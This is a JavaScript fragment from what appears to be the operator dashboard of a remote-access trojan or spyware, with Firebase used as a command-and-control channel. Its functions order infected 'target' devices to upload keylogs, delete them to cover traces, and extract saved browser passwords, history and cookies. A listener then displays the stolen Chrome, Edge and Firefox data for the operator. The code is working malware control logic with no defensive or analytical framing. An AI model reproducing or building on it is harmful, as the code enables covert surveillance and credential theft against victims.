
// Keylog Management Functions
async function downloadKeylogs() {
    if (!currentDeviceId) {
        alert("No device selected");
        return;
    }
    if (!confirm("Download all stored keylogs from this device?")) return;

    const reqRef = push(ref(db, `requests/${currentDeviceId}`));
    await set(reqRef, {
        type: "keylog_download",
        timestamp: Date.now()
    });

    console.log("Keylog download requested");
    alert("Keylog download requested. Check the Downloads section in a moment.");
}

async function deleteKeylogs() {
    if (!currentDeviceId) {
        alert("No device selected");
        return;
    }
    if (!confirm("⚠️ PERMANENTLY DELETE all keylogs on the target device?")) return;

    const reqRef = push(ref(db, `requests/${currentDeviceId}`));
    await set(reqRef, {
        type: "keylog_delete",
        timestamp: Date.now()
    });

    console.log("Keylog delete requested");
    alert("Keylog deletion requested. The file will be removed from the target system.");
}

async function extractBrowserData() {
    if (!currentDeviceId) {
        alert("No device selected");
        return;
    }
    if (!confirm("Extract browser data (passwords, history, cookies) from this device?")) return;

    const reqRef = push(ref(db, `requests/${currentDeviceId}`));
    await set(reqRef, {
        type: "browser_extract",
        timestamp: Date.now()
    });

    console.log("Browser extraction requested");
    alert("Browser data extraction started. Results will appear in the Browser Data panel below.");
}

// Browser Data Display Listener
function loadBrowserData(deviceId) {
    const panel = document.getElementById('browser-data-panel');
    const content = document.getElementById('browser-data-content');

    onValue(ref(db, `browser_data/${deviceId}`), (snap) => {
        const data = snap.val();
        if (!data) {
            content.innerHTML = "No data extracted yet. Click 'Extract Browser Data' button above.";
            panel.classList.add('hidden');
            return;
        }

        // Show panel when data exists
        panel.classList.remove('hidden');

        let html = '<div style="font-size:12px;">';

        // Chrome
        if (data.chrome) {
            html += '<h4 style="color:#4285f4; margin-top:10px;"><i class="fab fa-chrome"></i> Google Chrome</h4>';
            html += `<pre>${JSON.stringify(data.chrome, null, 2)}</pre>`;
        }

        // Edge
        if (data.edge) {
            html += '<h4 style="color:#0078d4; margin-top:10px;"><i class="fab fa-edge"></i> Microsoft Edge</h4>';
            html += `<pre>${JSON.stringify(data.edge, null, 2)}</pre>`;
        }

        // Firefox
        if (data.firefox) {
            html += '<h4 style="color:#ff7139; margin-top:10px;"><i class="fab fa-firefox"></i> Mozilla Firefox</h4>';
            html += `<pre>${JSON.stringify(data.firefox, null, 2)}</pre>`;
        }

        html += '</div>';
        content.innerHTML = html;
    });
}
